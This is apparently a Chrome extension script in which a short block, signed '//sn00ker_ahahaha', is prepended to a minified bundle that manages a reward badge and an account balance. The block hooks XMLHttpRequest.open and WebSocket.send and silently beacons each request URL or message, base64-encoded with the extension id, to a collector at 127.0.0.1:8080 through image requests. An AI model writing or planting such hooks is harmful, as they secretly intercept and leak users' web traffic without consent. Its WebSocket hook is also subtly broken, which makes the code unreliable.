function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(n){function t(r){if(e[r])return e[r].exports;var o=e[r]={i:r,l:!1,exports:{}};return n[r].call(o.exports,o,o.exports,t),o.l=!0,o.exports}var e={};t.m=n,t.c=e,t.i=function(n){return n},t.d=function(n,e,r){t.o(n,e)||Object.defineProperty(n,e,{configurable:!1,enumerable:!0,get:r})},t.n=function(n){var e=n&&n.__esModule?function(){return n.default}:function(){return n};return t.d(e,"a",e),e},t.o=function(n,t){return Object.prototype.hasOwnProperty.call(n,t)},t.p="",t(t.s=99)}({7:function(n,t,e){"use strict";e.d(t,"b",function(){return r}),e.d(t,"c",function(){return o}),e.d(t,"a",function(){return c});var r=function(n,t){chrome.tabs.query({active:!0,currentWindow:!0},function(e){chrome.tabs.sendMessage(e[0].id,n,t)})},o=function(n,t){chrome.runtime.sendMessage(n,t)},c=function(n){chrome.runtime.onMessage.addListener(n)}},80:function(n,t,e){"use strict";e.d(t,"b",function(){return r}),e.d(t,"a",function(){return o});var r=function(n){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:function(){};chrome.storage.sync.set(n,function(n){t(n)})},o=function(n,t){chrome.storage.sync.get(n,function(n){t(n)})}},83:function(n,t,e){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var r=e(7),o=e(80);chrome.browserAction.setBadgeBackgroundColor({color:[255,0,0,255]});var c=0;e.i(r.a)(function(n,t,r){"is-content-script-loaded"in n||"filter"in n&&"reward"===n.filter&&(c=++c,chrome.browserAction.setBadgeText({text:String(c)}),chrome.browserAction.setBadgeBackgroundColor({color:[255,0,0,255]}),setTimeout(function(){chrome.browserAction.setBadgeBackgroundColor({color:[0,170,4,255]}),e.i(o.a)("account",function(n){n.account||(n={account:{address:"9CFE3D775AA407A754E6FB86BF33099F0BF325F9",balance:3}}),n.account.balance+=.5,e.i(o.b)(n,function(n){})})},15e3),r({success:!0,data:n}))})},99:function(n,t,e){n.exports=e(83)}});